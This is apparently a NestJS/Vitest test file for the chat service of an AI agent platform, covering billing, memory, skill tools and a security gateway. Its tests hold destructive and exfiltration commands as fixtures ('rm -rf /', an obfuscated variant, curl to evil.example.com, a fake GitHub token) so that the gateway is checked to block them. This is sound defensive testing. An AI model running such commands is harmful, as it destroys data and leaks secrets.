import {
  BadRequestException,
  ForbiddenException,
  NotFoundException,
} from '@nestjs/common';
import {
  AIMessage,
  type BaseMessage,
  HumanMessage,
  ToolMessage,
} from '@langchain/core/messages';
import { Test, TestingModule } from '@nestjs/testing';
import { MemorySaver } from '@langchain/langgraph';
import type { BaseCheckpointSaver } from '@langchain/langgraph-checkpoint';
import type { InstalledSkill } from '@prisma/client';
import type { SkillPermission } from '@skillwharf/shared';
import { createFakeCheckpointPrisma } from '../../test/checkpointer/fake-checkpoint-store.js';
import { BillingService } from '../billing/billing.service.js';
import { ERROR_KEYS } from '../i18n/error-keys.js';
import {
  AUDIT_FRAUD_RISK_TOOL_NAME,
  CALCULATE_UNIT_ECONOMICS_TOOL_NAME,
  CHECK_FACTS_TOOL_NAME,
  DETECT_PROFIT_LEAKS_TOOL_NAME,
  EXEC_TOOL_NAME,
  EXTRACT_DOCUMENT_DATA_TOOL_NAME,
  GENERATE_IMAGE_TOOL_NAME,
  GOOGLE_DOCS_CREATE_TOOL_NAME,
  GOOGLE_SHEETS_APPEND_TOOL_NAME,
  LlmService,
  MONITOR_COMPETITOR_PRICES_TOOL_NAME,
  OZON_MCP_TOOL_NAME,
  PUBLISH_TO_DZEN_TOOL_NAME,
  RUN_WORKFLOW_TOOL_NAME,
  SANDBOX_TOOL_NAME,
  SCREEN_RESUME_TOOL_NAME,
  SEND_MESSAGE_TOOL_NAME,
  WB_MCP_TOOL_NAME,
  WEB_SEARCH_TOOL_NAME,
  messageContentToText,
  type ChatStreamChunk,
} from '../llm/llm.service.js';
import { LlmRouterService } from '../llm-router/llm-router.service.js';
import { MemoryService } from '../memory/memory.service.js';
import { PrismaService } from '../prisma/prisma.service.js';
import { AgentGatewayService } from '../security/agent-gateway.service.js';
import type { SandboxService } from '../sandbox/sandbox.service.js';
import { SkillsService } from '../skills/skills.service.js';
import { ChatService } from './chat.service.js';
import type { OfficeEvent } from './office-events.js';
import {
  PendingApprovalService,
  type PendingApprovalHold,
  type PendingApprovalRecord,
  type PendingApprovalReason,
} from './persistence/pending-approval.service.js';
import { GRAPH_CHECKPOINTER } from './persistence/persistence.module.js';
import { PrismaCheckpointSaver } from './persistence/prisma-checkpoint.saver.js';

/**
 * In-memory замена PendingApprovalService для unit/интеграционных тестов.
 * Хранилище можно передать двум ChatService — это эмулирует durable-таблицу
 * между «рестартами» API.
 */
class FakePendingApprovals {
  private readonly rows = new Map<string, PendingApprovalRecord>();

  async upsertPending(input: {
    conversationId: string;
    userId: string;
    reason: PendingApprovalReason;
    tools: readonly string[];
    holds: readonly PendingApprovalHold[];
  }): Promise<PendingApprovalRecord> {
    const existing = this.rows.get(input.conversationId);
    const record: PendingApprovalRecord = {
      id: existing?.id ?? `pending-${this.rows.size + 1}`,
      conversationId: input.conversationId,
      userId: input.userId,
      reason: input.reason,
      tools: [...input.tools],
      holds: [...input.holds],
      status: 'pending',
      createdAt: existing?.createdAt ?? new Date(),
      resolvedAt: null,
    };

    this.rows.set(input.conversationId, record);

    return record;
  }

  async findPending(
    conversationId: string,
  ): Promise<PendingApprovalRecord | null> {
    const record = this.rows.get(conversationId);

    return record?.status === 'pending' ? record : null;
  }

  async listPending(userId: string): Promise<PendingApprovalRecord[]> {
    return [...this.rows.values()]
      .filter((row) => row.userId === userId && row.status === 'pending')
      .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime());
  }

  async resolvePending(
    conversationId: string,
    status: 'approved' | 'rejected',
  ): Promise<number> {
    const record = this.rows.get(conversationId);

    if (!record || record.status !== 'pending') {
      return 0;
    }

    record.status = status;
    record.resolvedAt = new Date();

    return 1;
  }
}

const CONVERSATION_ID = '11111111-1111-1111-1111-111111111111';
const USER_ID = '22222222-2222-2222-2222-222222222222';
const OTHER_USER_ID = '33333333-3333-3333-3333-333333333333';

/** Секрет (GitHub PAT-формат), который извлекает taint-анализатор. */
const LEAKED_TOKEN = `ghp_${'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'.slice(0, 36)}`;

type MockFn = ReturnType<typeof vi.fn>;

interface PrismaMock {
  conversation: { findUnique: MockFn; update: MockFn; create: MockFn };
  message: { create: MockFn; findMany: MockFn };
  user: { findUnique: MockFn };
}

interface SandboxMock {
  runCommand: MockFn;
}

interface BillingMock {
  checkAndChargeSkill: MockFn;
  getBalance: MockFn;
  authorizeHold: MockFn;
  captureHold: MockFn;
  cancelHold: MockFn;
}

interface SkillsMock {
  getEnabledSkills: MockFn;
}

interface RouterMock {
  selectRoute: MockFn;
}

interface MemoryMock {
  buildContext: MockFn;
  remember: MockFn;
  clear: MockFn;
}

interface TestPricing {
  model: 'Free' | 'Pay-per-Call' | 'Pay-per-Outcome' | 'Freemium';
  price?: number;
  currency?: 'RUB' | 'USD';
  freeCallsLimit?: number;
}

function toolCallMessage(
  name: string,
  args: Record<string, unknown>,
): AIMessage {
  return new AIMessage({
    content: '',
    tool_calls: [{ id: 'call-1', name, args }],
  });
}

/** Стрим, который отдаёт текст сообщения одним чанком и финальное сообщение. */
function streamOf(message: AIMessage): AsyncGenerator<ChatStreamChunk> {
  return (async function* () {
    const text = messageContentToText(message.content);

    if (text) {
      yield { type: 'delta', text };
    }

    yield { type: 'message', message };
  })();
}

/** Разрешения и egress, которые обычно объявляет навык для инструмента. */
interface SkillOptions {
  permissions?: readonly SkillPermission[];
  egressAllowlist?: readonly string[];
  mcpEndpoint?: string;
}

/** Разрешения, которые тестовый навык объявляет по умолчанию для инструмента. */
const DEFAULT_PERMISSIONS: Readonly<Record<string, readonly SkillPermission[]>> =
  {
    [SANDBOX_TOOL_NAME]: ['shell'],
    [EXEC_TOOL_NAME]: ['shell', 'network'],
    [WEB_SEARCH_TOOL_NAME]: ['network'],
    [OZON_MCP_TOOL_NAME]: ['network'],
    [WB_MCP_TOOL_NAME]: ['network'],
  };

/** Egress, который тестовый навык объявляет по умолчанию (network-инструменты). */
const DEFAULT_EGRESS: Readonly<Record<string, readonly string[]>> = {
  [EXEC_TOOL_NAME]: ['api.github.com', 'github.com'],
  [WEB_SEARCH_TOOL_NAME]: ['api.tavily.com'],
  [OZON_MCP_TOOL_NAME]: ['api.ozon.ru'],
  [WB_MCP_TOOL_NAME]: ['api.wildberries.ru'],
};

function createSkill(
  name: string,
  tool: string,
  pricing?: TestPricing,
  requiresApproval = false,
  options: SkillOptions = {},
): InstalledSkill {
  const permissions = options.permissions ?? DEFAULT_PERMISSIONS[tool] ?? [];
  const egress = options.egressAllowlist ?? DEFAULT_EGRESS[tool];

  return {
    id: `skill-${name}`,
    name,
    version: '1.0.0',
    author: 'SkillWharf Team',
    manifest: {
      name,
      version: '1.0.0',
      description: `Тестовый навык ${name}`,
      author: { name: 'SkillWharf Team' },
      dependencies: { tools: [tool] },
      permissions: [...permissions],
      ...(egress ? { egress_allowlist: [...egress] } : {}),
      ...(options.mcpEndpoint ? { mcp_endpoint: options.mcpEndpoint } : {}),
      ...(pricing ? { pricing } : {}),
      ...(requiresApproval ? { requiresApproval: true } : {}),
    },
    isEnabled: true,
    installedAt: new Date(),
  } as unknown as InstalledSkill;
}

describe('ChatService', () => {
  let service: ChatService;
  let prisma: PrismaMock;
  let sandbox: SandboxMock;
  let billing: BillingMock;
  let skills: SkillsMock;
  let router: RouterMock;
  let memory: MemoryMock;
  let llm: LlmService;
  let chatWithToolsStream: ReturnType<typeof vi.spyOn>;
  let checkpointer: MemorySaver;
  let pendingApprovals: FakePendingApprovals;

  /** Минимальный контракт хранилища ожиданий для ChatService. */
  type PendingApprovalStore = Pick<
    FakePendingApprovals,
    'upsertPending' | 'findPending' | 'listPending' | 'resolvePending'
  >;

  /**
   * Собирает ChatService на текущих моках. Переданные saver/pending-store
   * позволяют создать второй экземпляр поверх того же состояния — эмуляция
   * рестарта API (граф и кэши процесса теряются, PostgreSQL остаётся).
   */
  async function createServiceInstance(
    saver: BaseCheckpointSaver,
    pendingStore: PendingApprovalStore,
  ): Promise<ChatService> {
    const moduleRef: TestingModule = await Test.createTestingModule({
      providers: [
        ChatService,
        { provide: PrismaService, useValue: prisma },
        { provide: LlmService, useValue: llm },
        { provide: BillingService, useValue: billing },
        { provide: SkillsService, useValue: skills },
        { provide: LlmRouterService, useValue: router },
        AgentGatewayService,
        { provide: MemoryService, useValue: memory },
        { provide: GRAPH_CHECKPOINTER, useValue: saver },
        { provide: PendingApprovalService, useValue: pendingStore },
      ],
    }).compile();

    return moduleRef.get(ChatService);
  }

  beforeEach(async () => {
    prisma = {
      conversation: {
        findUnique: vi.fn(),
        update: vi.fn(),
        create: vi.fn(),
      },
      message: { create: vi.fn(), findMany: vi.fn() },
      user: { findUnique: vi.fn().mockResolvedValue({ role: 'user' }) },
    };
    sandbox = { runCommand: vi.fn() };
    billing = {
      checkAndChargeSkill: vi.fn(),
      getBalance: vi.fn(),
      authorizeHold: vi.fn(),
      captureHold: vi.fn(),
      cancelHold: vi.fn(),
    };
    skills = { getEnabledSkills: vi.fn().mockResolvedValue([]) };
    router = { selectRoute: vi.fn().mockResolvedValue(null) };
    memory = {
      buildContext: vi.fn().mockResolvedValue(''),
      remember: vi.fn().mockResolvedValue(undefined),
      clear: vi.fn().mockResolvedValue(0),
    };

    // Настоящий LlmService нужен, чтобы граф получил реальные инструменты;
    // сам вызов модели подменяем.
    llm = new LlmService(sandbox as unknown as SandboxService);
    chatWithToolsStream = vi.spyOn(llm, 'chatWithToolsStream');

    checkpointer = new MemorySaver();
    pendingApprovals = new FakePendingApprovals();
    service = await createServiceInstance(checkpointer, pendingApprovals);
  });

  afterEach(() => {
    vi.unstubAllEnvs();
  });

  describe('createConversation', () => {
    it('создаёт диалог для пользователя с заголовком по умолчанию', async () => {
      prisma.conversation.create.mockResolvedValue({ id: CONVERSATION_ID });

      const result = await service.createConversation(USER_ID);

      expect(result).toEqual({ id: CONVERSATION_ID });
      expect(prisma.conversation.create).toHaveBeenCalledWith({
        data: { userId: USER_ID, title: 'Новый диалог' },
        select: { id: true },
      });
    });

    it('использует переданный заголовок', async () => {
      prisma.conversation.create.mockResolvedValue({ id: CONVERSATION_ID });

      await service.createConversation(USER_ID, '  Мой чат  ');

      expect(prisma.conversation.create).toHaveBeenCalledWith({
        data: { userId: USER_ID, title: 'Мой чат' },
        select: { id: true },
      });
    });
  });

  describe('clearMemory', () => {
    it('удаляет долговременную память текущего пользователя (GDPR)', async () => {
      memory.clear.mockResolvedValue(5);

      await expect(service.clearMemory(USER_ID)).resolves.toEqual({
        deleted: 5,
      });
      expect(memory.clear).toHaveBeenCalledWith(USER_ID);
    });
  });

  describe('handleMessage', () => {
    beforeEach(() => {
      prisma.conversation.findUnique.mockResolvedValue({
        id: CONVERSATION_ID,
        userId: USER_ID,
      });
      prisma.message.create.mockResolvedValue({});
      prisma.conversation.update.mockResolvedValue({});
      billing.getBalance.mockResolvedValue({ balance: '10.00' });
    });

    it('сохраняет сообщения и возвращает ответ LLM', async () => {
      prisma.message.findMany.mockResolvedValue([
        { role: 'assistant', content: 'предыдущий ответ' },
        { role: 'user', content: 'привет' },
      ]);
      router.selectRoute.mockResolvedValue({
        id: 'route-1',
        name: 'local',
        modelName: 'llama3',
        baseUrl: 'http://localhost:11435/v1',
        apiKeyEnvVar: null,
      });
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(new AIMessage('ответ ассистента')),
      );

      const result = await service.handleMessage(
        USER_ID,
        CONVERSATION_ID,
        'привет',
      );

      expect(result).toEqual({
        conversationId: CONVERSATION_ID,
        reply: 'ответ ассистента',
      });

      expect(prisma.message.create).toHaveBeenNthCalledWith(1, {
        data: {
          conversationId: CONVERSATION_ID,
          role: 'user',
          content: 'привет',
        },
      });
      expect(prisma.message.create).toHaveBeenNthCalledWith(2, {
        data: {
          conversationId: CONVERSATION_ID,
          role: 'assistant',
          content: 'ответ ассистента',
        },
      });

      expect(prisma.message.findMany).toHaveBeenCalledWith(
        expect.objectContaining({
          where: { conversationId: CONVERSATION_ID },
          orderBy: { createdAt: 'desc' },
          take: 10,
        }),
      );

      const [messages, tools, llmRoute] = chatWithToolsStream.mock.calls[0] as [
        BaseMessage[],
        { name: string }[],
        unknown,
      ];

      // История уходит в LLM в хронологическом порядке (старые → новые).
      expect(messages).toHaveLength(2);
      expect(messages[0]).toBeInstanceOf(HumanMessage);
      expect(messages[0]?.content).toBe('привет');
      expect(messages[1]).toBeInstanceOf(AIMessage);
      expect(messages[1]?.content).toBe('предыдущий ответ');

      // Роутер выбран до вызова LLM, маршрут ушёл в модель.
      expect(router.selectRoute).toHaveBeenCalledTimes(1);
      expect(llmRoute).toMatchObject({ modelName: 'llama3' });

      // LLM получает инструменты песочницы, поиска и shell-команд.
      expect(tools.map((tool) => tool.name)).toEqual([
        SANDBOX_TOOL_NAME,
        WEB_SEARCH_TOOL_NAME,
        EXEC_TOOL_NAME,
      ]);
      expect(billing.getBalance).toHaveBeenCalledWith(USER_ID);
      expect(skills.getEnabledSkills).toHaveBeenCalledTimes(1);
      expect(billing.checkAndChargeSkill).not.toHaveBeenCalled();
    });

    it('подмешивает найденные чанки памяти в промпт LLM', async () => {
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'привет' },
      ]);
      memory.buildContext.mockResolvedValue(
        '1. Клиент предпочитает самовывоз\n2. Скидка 10% для постоянных клиентов',
      );
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(new AIMessage('ответ ассистента')),
      );

      await service.handleMessage(USER_ID, CONVERSATION_ID, 'привет');

      // Память ищется по последнему сообщению пользователя.
      expect(memory.buildContext).toHaveBeenCalledWith(USER_ID, 'привет');

      const [, , , options] = chatWithToolsStream.mock.calls[0] as [
        BaseMessage[],
        unknown[],
        unknown,
        { userId?: string; memoryContext?: string },
      ];

      expect(options.memoryContext).toContain('Клиент предпочитает самовывоз');
      expect(options.memoryContext).toContain('Скидка 10%');
    });

    it('сохраняет новые сообщения диалога в долговременную память', async () => {
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'привет' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(new AIMessage('ответ ассистента')),
      );

      await service.handleMessage(USER_ID, CONVERSATION_ID, 'привет');

      expect(memory.remember).toHaveBeenNthCalledWith(1, USER_ID, 'привет');
      expect(memory.remember).toHaveBeenNthCalledWith(
        2,
        USER_ID,
        'ответ ассистента',
      );
    });

    it('подключает marketplace-инструменты из манифестов', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('ozon-seller', OZON_MCP_TOOL_NAME, { model: 'Free' }),
        createSkill('wb-seller', WB_MCP_TOOL_NAME, { model: 'Free' }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'покажи продажи' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(new AIMessage('Готово')),
      );

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'покажи продажи'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      const [, tools] = chatWithToolsStream.mock.calls[0] as [
        BaseMessage[],
        { name: string }[],
      ];

      expect(tools.map((tool) => tool.name)).toEqual(
        expect.arrayContaining([OZON_MCP_TOOL_NAME, WB_MCP_TOOL_NAME]),
      );
    });

    it('подключает отраслевые mock-инструменты из манифестов', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('messenger-connector', SEND_MESSAGE_TOOL_NAME, {
          model: 'Free',
        }),
        createSkill('google-workspace', GOOGLE_SHEETS_APPEND_TOOL_NAME, {
          model: 'Free',
        }),
        createSkill('google-workspace', GOOGLE_DOCS_CREATE_TOOL_NAME, {
          model: 'Free',
        }),
        createSkill('midjourney-api', GENERATE_IMAGE_TOOL_NAME, {
          model: 'Free',
        }),
        createSkill('workflow-orchestrator', RUN_WORKFLOW_TOOL_NAME, {
          model: 'Free',
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'сделай отчёт' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(new AIMessage('Готово')),
      );

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'сделай отчёт'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      const [, tools] = chatWithToolsStream.mock.calls[0] as [
        BaseMessage[],
        { name: string }[],
      ];

      expect(tools.map((tool) => tool.name)).toEqual(
        expect.arrayContaining([
          SEND_MESSAGE_TOOL_NAME,
          GOOGLE_SHEETS_APPEND_TOOL_NAME,
          GOOGLE_DOCS_CREATE_TOOL_NAME,
          GENERATE_IMAGE_TOOL_NAME,
          RUN_WORKFLOW_TOOL_NAME,
        ]),
      );
    });

    it('подключает content, HR и legal mock-инструменты', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('dzen-article', PUBLISH_TO_DZEN_TOOL_NAME, {
          model: 'Pay-per-Outcome',
          price: 100,
        }),
        createSkill('fact-checker', CHECK_FACTS_TOOL_NAME),
        createSkill('resume-screener', SCREEN_RESUME_TOOL_NAME),
        createSkill('document-analyzer', EXTRACT_DOCUMENT_DATA_TOOL_NAME),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'подготовь статью' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(new AIMessage('Готово')),
      );

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'подготовь статью'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      const [, tools] = chatWithToolsStream.mock.calls[0] as [
        BaseMessage[],
        { name: string }[],
      ];

      expect(tools.map((tool) => tool.name)).toEqual(
        expect.arrayContaining([
          PUBLISH_TO_DZEN_TOOL_NAME,
          CHECK_FACTS_TOOL_NAME,
          SCREEN_RESUME_TOOL_NAME,
          EXTRACT_DOCUMENT_DATA_TOOL_NAME,
        ]),
      );
    });

    it('подключает финансовые mock-инструменты', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('unit-economics', CALCULATE_UNIT_ECONOMICS_TOOL_NAME, {
          model: 'Free',
        }),
        createSkill('profit-leak-detector', DETECT_PROFIT_LEAKS_TOOL_NAME, {
          model: 'Pay-per-Call',
          price: 300,
        }),
        createSkill('price-monitor', MONITOR_COMPETITOR_PRICES_TOOL_NAME, {
          model: 'Free',
        }),
        createSkill('fraud-shield-audit', AUDIT_FRAUD_RISK_TOOL_NAME, {
          model: 'Pay-per-Outcome',
          price: 500,
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'посчитай маржу' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(new AIMessage('Готово')),
      );

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'посчитай маржу'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      const [, tools] = chatWithToolsStream.mock.calls[0] as [
        BaseMessage[],
        { name: string }[],
      ];

      expect(tools.map((tool) => tool.name)).toEqual(
        expect.arrayContaining([
          CALCULATE_UNIT_ECONOMICS_TOOL_NAME,
          DETECT_PROFIT_LEAKS_TOOL_NAME,
          MONITOR_COMPETITOR_PRICES_TOOL_NAME,
          AUDIT_FRAUD_RISK_TOOL_NAME,
        ]),
      );
    });

    it('captureHold при успешном Pay-per-Outcome инструменте', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('outcome-skill', SANDBOX_TOOL_NAME, {
          model: 'Pay-per-Outcome',
          price: 1.5,
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'выполни задачу' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
      sandbox.runCommand.mockResolvedValue('hi\n');
      billing.authorizeHold.mockResolvedValue({ entryId: 'hold-1' });

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'выполни задачу'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      expect(billing.authorizeHold).toHaveBeenCalledWith(
        USER_ID,
        1.5,
        expect.any(String),
      );
      expect(billing.captureHold).toHaveBeenCalledWith('hold-1');
      expect(billing.cancelHold).not.toHaveBeenCalled();
    });

    it('cancelHold при ошибке Pay-per-Outcome инструмента', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('outcome-skill', SANDBOX_TOOL_NAME, {
          model: 'Pay-per-Outcome',
          price: 1.5,
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'выполни задачу' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
      );
      sandbox.runCommand.mockRejectedValue(new Error('sandbox failed'));
      billing.authorizeHold.mockResolvedValue({ entryId: 'hold-1' });

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'выполни задачу'),
      ).rejects.toThrow('sandbox failed');

      expect(billing.cancelHold).toHaveBeenCalledWith('hold-1');
      expect(billing.captureHold).not.toHaveBeenCalled();
    });

    it('блокирует опасный вызов инструмента через Agent Gateway', async () => {
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'удали всё' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'rm -rf /' })),
      );

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'удали всё'),
      ).rejects.toMatchObject({
        status: 403,
        response: { code: 'errors.policy_blocked' },
      });

      expect(sandbox.runCommand).not.toHaveBeenCalled();
      expect(billing.authorizeHold).not.toHaveBeenCalled();
    });

    it('блокирует обфускацию rm -rf, которую пропускал старый regex', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('code-runner', SANDBOX_TOOL_NAME),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'удали всё' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: "r''m -rf /" })),
      );

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'удали всё'),
      ).rejects.toMatchObject({
        status: 403,
        response: { code: 'errors.policy_blocked' },
      });

      expect(sandbox.runCommand).not.toHaveBeenCalled();
    });

    it('разрешает сеть в песочнице только с network-разрешением навыка и передаёт allowlist', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('network-skill', SANDBOX_TOOL_NAME, undefined, false, {
          permissions: ['network', 'shell'],
          egressAllowlist: ['api.tavily.com'],
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'сходи в API' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(
            toolCallMessage(SANDBOX_TOOL_NAME, {
              code: 'curl https://api.tavily.com/search',
            }),
          ),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
      sandbox.runCommand.mockResolvedValue('{}');

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'сходи в API'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      expect(sandbox.runCommand.mock.calls[0]?.[2]).toEqual({
        egress: { allowlist: ['api.tavily.com'] },
      });
    });

    it('запрещает сетевой код без network-разрешения навыка', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('code-runner', SANDBOX_TOOL_NAME),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'сходи в интернет' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(
          toolCallMessage(SANDBOX_TOOL_NAME, {
            code: 'curl https://evil.example.com/leak',
          }),
        ),
      );

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'сходи в интернет'),
      ).rejects.toMatchObject({
        status: 403,
        response: { code: 'errors.policy_blocked' },
      });

      expect(sandbox.runCommand).not.toHaveBeenCalled();
    });

    it('не запускает shell-инструменты от имени гостя', async () => {
      prisma.user.findUnique.mockResolvedValue({ role: 'guest' });
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'запусти echo' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
      );

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'запусти echo'),
      ).rejects.toMatchObject({
        status: 403,
        response: { code: 'errors.policy_blocked' },
      });

      expect(sandbox.runCommand).not.toHaveBeenCalled();
    });

    it('маскирует секрет из web_search в следующем поисковом запросе (taint)', async () => {
      vi.stubEnv('TAVILY_API_KEY', 'test-tavily-key');
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('tavily-search', WEB_SEARCH_TOOL_NAME),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'найди токен' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(
            toolCallMessage(WEB_SEARCH_TOOL_NAME, { query: 'токены github' }),
          ),
        )
        .mockReturnValueOnce(
          streamOf(
            toolCallMessage(WEB_SEARCH_TOOL_NAME, {
              query: `повтори ${LEAKED_TOKEN}`,
            }),
          ),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
      sandbox.runCommand
        .mockResolvedValueOnce(`{"results":[{"snippet":"${LEAKED_TOKEN}"}]}`)
        .mockResolvedValueOnce('{"results":[]}');

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'найди токен'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      const secondEnv = sandbox.runCommand.mock.calls[1]?.[1] as
        | Record<string, string>
        | undefined;
      const requestBody = JSON.parse(
        secondEnv?.TAVILY_REQUEST_BODY ?? '{}',
      ) as { query?: string };

      expect(requestBody.query).toContain('[REDACTED]');
      expect(requestBody.query).not.toContain(LEAKED_TOKEN);
    });

    it('блокирует утечку секрета из web_search в exec (taint)', async () => {
      vi.stubEnv('TAVILY_API_KEY', 'test-tavily-key');
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('tavily-search', WEB_SEARCH_TOOL_NAME),
        createSkill('github', EXEC_TOOL_NAME),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'найди токен и выполни' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(
            toolCallMessage(WEB_SEARCH_TOOL_NAME, { query: 'токены github' }),
          ),
        )
        .mockReturnValueOnce(
          streamOf(
            toolCallMessage(EXEC_TOOL_NAME, {
              command: `echo ${LEAKED_TOKEN}`,
            }),
          ),
        );
      sandbox.runCommand
        .mockResolvedValueOnce(`{"results":[{"snippet":"${LEAKED_TOKEN}"}]}`)
        .mockResolvedValueOnce('ok');

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'найди токен и выполни'),
      ).rejects.toMatchObject({
        status: 403,
        response: { code: 'errors.policy_blocked' },
      });

      // Успел выполниться только безопасный web_search.
      expect(sandbox.runCommand).toHaveBeenCalledTimes(1);
    });

    it('не запускает агента при балансе ниже минимального', async () => {
      billing.getBalance.mockResolvedValue({ balance: '0.49' });

      const attempt = service.handleMessage(USER_ID, CONVERSATION_ID, 'привет');

      await expect(attempt).rejects.toBeInstanceOf(BadRequestException);
      await expect(attempt).rejects.toThrow(ERROR_KEYS.insufficientFunds);

      expect(prisma.message.create).not.toHaveBeenCalled();
      expect(skills.getEnabledSkills).not.toHaveBeenCalled();
      expect(chatWithToolsStream).not.toHaveBeenCalled();
      expect(billing.checkAndChargeSkill).not.toHaveBeenCalled();
    });

    it('разрешает запуск при балансе ровно 0.50', async () => {
      billing.getBalance.mockResolvedValue({ balance: '0.50' });
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'привет' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(streamOf(new AIMessage('ответ')));

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'привет'),
      ).resolves.toEqual({
        conversationId: CONVERSATION_ID,
        reply: 'ответ',
      });
    });

    it('списывает цену из манифеста навыка (Pay-per-Call)', async () => {
      vi.stubEnv('TAVILY_API_KEY', 'test-tavily-key');
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('tavily-search', WEB_SEARCH_TOOL_NAME, {
          model: 'Pay-per-Call',
          price: 0.05,
          currency: 'RUB',
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'найди новости' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(WEB_SEARCH_TOOL_NAME, { query: 'новости' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
      billing.checkAndChargeSkill.mockResolvedValue({
        balance: '9.95',
        entryId: 'entry-1',
      });
      sandbox.runCommand.mockResolvedValue('{"results":[]}');

      const result = await service.handleMessage(
        USER_ID,
        CONVERSATION_ID,
        'найди новости',
      );

      expect(result.reply).toBe('Готово');

      // Ровно цена из манифеста, а не прежние фиксированные 0.10.
      expect(billing.checkAndChargeSkill).toHaveBeenCalledWith(
        USER_ID,
        'tavily-search',
        0.05,
        0,
      );

      const [command, env, runOptions] = sandbox.runCommand.mock.calls[0] as [
        string,
        Record<string, string>,
        { egress?: { allowlist: readonly string[] } },
      ];

      expect(command).toContain('https://api.tavily.com/search');
      // Сеть включается только egress-allowlist из манифеста навыка.
      expect(runOptions).toEqual({ egress: { allowlist: ['api.tavily.com'] } });
      expect(env).toEqual({ TAVILY_REQUEST_BODY: expect.any(String) });

      // Сначала деньги, потом запуск инструмента.
      expect(
        billing.checkAndChargeSkill.mock.invocationCallOrder[0],
      ).toBeLessThan(sandbox.runCommand.mock.invocationCallOrder[0]);

      // Результат инструмента вернулся в LLM вторым вызовом.
      expect(chatWithToolsStream).toHaveBeenCalledTimes(2);
      const [secondCallMessages] = chatWithToolsStream.mock.calls[1] as [
        BaseMessage[],
        unknown[],
      ];
